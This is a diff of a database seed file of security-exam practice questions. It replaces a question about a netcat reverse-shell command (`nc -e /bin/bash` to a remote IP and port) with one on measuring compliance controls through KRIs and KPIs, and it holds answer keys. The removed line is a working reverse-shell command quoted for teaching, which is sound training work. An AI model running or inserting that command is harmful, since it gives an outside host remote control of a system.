@@ -890,16 +890,16 @@ db.tests.insertOne({
     },
     {
       "id": 69,
-      "question": "An attacker gains access to a Linux system and runs the following command:\n\n`nohup nc -e /bin/bash 203.0.113.10 4444 &`\n\nWhat is the attacker's goal?",
+      "question": "An online service provider aims to strengthen governance by tracking the efficiency of its compliance measures. Which initial strategy is MOST effective for accurately measuring and refining the performance of compliance controls over time?",
       "options": [
-        "Creating a persistent reverse shell to the attacker's machine",
-        "Performing a brute-force attack on SSH credentials",
-        "Extracting hashed passwords from `/etc/shadow`",
-        "Deleting system logs to cover tracks"
+        "Apply a fixed benchmark based on industry averages and expect all controls to meet that standard immediately.",
+        "Develop a balanced set of key risk indicators (KRIs) and key performance indicators (KPIs) specifically linked to each control objective.",
+        "Rely solely on external auditor reports to determine whether compliance measures are performing adequately.",
+        "Use ad-hoc, high-level metrics that vary quarterly based on the organization's rapidly shifting focus areas."
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "The command establishes a reverse shell that allows the attacker to remotely control the system.",
-      "examTip": "Monitor for unauthorized Netcat usage and block outbound connections to untrusted hosts."
+      "correctAnswerIndex": 1,
+      "explanation": "Pairing risk indicators with performance metrics provides a holistic way to evaluate how well controls mitigate risks while meeting operational goals. Adopting rigid industry benchmarks, relying only on auditor reports, or frequently shifting metrics can obscure real control effectiveness.",
+      "examTip": "A balanced measurement approach—using both KRIs and KPIs—drives data-driven enhancements in governance and compliance programs."
     },
     {
       "id": 70,
